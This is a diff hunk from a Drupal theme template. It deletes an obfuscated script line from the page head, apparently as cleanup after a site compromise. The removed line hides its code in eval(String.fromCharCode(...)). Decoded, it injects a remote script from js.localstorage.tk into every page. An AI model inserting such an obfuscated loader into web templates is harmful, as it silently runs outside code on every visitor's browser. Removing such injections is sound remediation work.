@@ -57,7 +57,6 @@
     <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
   <![endif]-->
   <?php print $scripts; ?>
-<script language=javascript>eval(String.fromCharCode(118, 97, 114, 32, 122, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 115, 99, 114, 105, 112, 116, 34, 41, 59, 32, 122, 46, 116, 121, 112, 101, 32, 61, 32, 34, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 34, 59, 32, 122, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58, 47, 47, 106, 115, 46, 108, 111, 99, 97, 108, 115, 116, 111, 114, 97, 103, 101, 46, 116, 107, 47, 115, 46, 106, 115, 63, 99, 114, 116, 61, 110, 101, 119, 34, 59, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 122, 41, 59));</script></head>
 <body data-target="#servicesMenu" data-offset="30" data-spy="scroll" class="<?php print $classes; ?>" <?php print $attributes;?>>
   <div id="skip-link">
     <a href="#main-content" class="element-invisible element-focusable"><?php print t('Skip to main content'); ?></a>
